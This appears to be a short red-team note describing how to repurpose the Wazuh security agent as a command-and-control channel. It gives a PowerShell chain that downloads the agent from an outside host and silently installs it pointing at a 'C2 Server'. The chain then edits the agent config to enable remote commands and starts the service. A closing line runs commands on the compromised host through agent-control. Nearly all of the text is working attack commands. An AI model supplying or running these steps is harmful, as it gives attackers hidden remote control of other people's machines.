---
title: Wazuh
tags:
  - Enum
  - Exec
  - C2
references: 
- 
files: []
---


**C2 Connection**

```powershell.exe Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.5.3-1.msi -OutFile ${env:tmp}\wazuh-agent-4.5.3-1.msi; 
msiexec.exe /i ${env:tmp}\wazuh-agent-4.5.3-1.msi /q WAZUH_MANAGER='C2 Server' WAZUH_REGISTRATION_SERVER='C2 Server' WAZUH_AGENT_GROUP='1'; 
Start-Sleep -Seconds 20;
Add-Content -Path 'C:\Program Files (x86)\ossec-agent\local_internal_options.conf' -Value 'wazuh_command.remote_commands=1'; 
Add-Content -Path 'C:\Program Files (x86)\ossec-agent\local_internal_options.conf' -Value 'logcollector.remote_commands=1'; 
NET START WazuhSvc
```

**Execute Commmands**

once the agents connected the agent-control binary allows you to execute commands

```/var/ossec/bin/agent-control -R 'whoami'```
